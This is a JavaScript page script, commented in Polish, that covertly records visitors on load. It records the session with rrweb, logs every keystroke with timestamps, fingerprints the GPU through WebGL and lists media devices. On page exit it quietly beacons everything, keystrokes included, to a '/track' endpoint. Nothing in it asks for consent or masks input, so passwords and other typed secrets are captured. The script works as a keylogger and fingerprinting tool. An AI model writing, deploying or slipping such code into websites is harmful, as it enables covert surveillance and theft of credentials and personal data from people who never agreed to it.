document.addEventListener('DOMContentLoaded', () => {
    let events = [];
    const capturedKeys = [];
    let gpuInfo = {};
    let devices = [];

    // 1. Inicjalizacja nagrywania sesji przez rrweb
    rrweb.record({
        emit(event) {
            events.push(event);
        },
    });

    // 2. Przechwytywanie naciśnięć klawiszy
    document.addEventListener('keydown', (event) => {
        capturedKeys.push({
            key: event.key,
            code: event.code,
            timestamp: new Date().toISOString()
        });
    });

    // 3. Zbieranie informacji o GPU
    const getGpuInfo = () => {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpuInfo = debugInfo ? {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                } : {
                    vendor: 'N/A',
                    renderer: 'N/A',
                    error: 'WEBGL_debug_renderer_info not supported'
                };
                gpuInfo.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
                gpuInfo.version = gl.getParameter(gl.VERSION);
            } else {
                gpuInfo = { error: 'WebGL not supported' };
            }
        } catch (e) {
            gpuInfo = { error: e.message };
        }
    };

    // 4. Pobieranie listy urządzeń multimedialnych
    const getDevices = async () => {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const deviceList = await navigator.mediaDevices.enumerateDevices();
                devices = deviceList.map(d => ({ kind: d.kind, label: d.label, deviceId: d.deviceId }));
            }
        } catch (e) {
            devices = [{ error: e.message }];
        }
    };

    // 5. Pakowanie i wysyłanie danych w tle przy zamykaniu strony
    const sendData = () => {
        const payload = {
            subject: `Nowa sesja: ${new Date().toISOString()}`,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
            },
            gpuInfo,
            devices,
            keystrokes: [...capturedKeys],
            session_events: [...events],
        };
        
        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
        navigator.sendBeacon('/track', blob);
    };

    // Ustawienie nasłuchiwania na zdarzenie opuszczania strony
    window.addEventListener('beforeunload', sendData);

    // Wstępne zebranie danych przy starcie
    const initialDataFetch = async () => {
        getGpuInfo();
        await getDevices();
    };

    initialDataFetch();
});